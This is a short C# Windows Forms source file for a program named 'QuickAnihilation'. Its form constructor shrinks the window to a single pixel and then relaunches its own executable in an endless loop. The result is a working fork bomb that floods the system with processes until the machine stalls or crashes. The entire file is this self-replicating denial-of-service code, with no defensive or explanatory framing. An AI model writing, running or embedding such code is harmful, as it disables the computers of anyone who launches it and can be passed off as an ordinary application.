using System.Diagnostics;

namespace QuickAnihilation
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            ClientSize = new Size(1, 1);
            while (true)
            {
                Process.Start("QuickAnihilation.exe", "C:\\Users\\k4spa\\source\\repos\\KursALX\\QuickAnihilation\\bin\\Debug\\net6.0-windows");
            }
        }
    }
}